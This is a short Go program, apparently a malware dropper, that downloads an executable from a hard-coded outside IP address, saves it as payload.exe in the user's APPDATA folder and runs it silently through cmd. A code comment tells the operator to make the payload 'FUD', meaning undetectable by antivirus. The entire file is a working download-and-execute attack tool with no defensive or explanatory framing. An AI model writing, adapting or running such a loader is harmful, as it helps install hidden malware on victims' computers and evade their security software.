package main

import (
	"io"
	"net/http"
	"os"
	"os/exec"
)

func main() {
	fileURL := `http://23.92.29.11/x.exe` //URL to the Payload exe (make sure its FUD)

	output, _ := os.Create(os.Getenv("APPDATA") + "\\" + "payload.exe")
	defer output.Close()
	response, _ := http.Get(fileURL)
	defer response.Body.Close()
	_, err := io.Copy(output, response.Body)
	if err != nil {
	}

	Exec := exec.Command("cmd", "/C", os.Getenv("APPDATA")+"\\"+"payload.exe")
	Exec.Start()
}
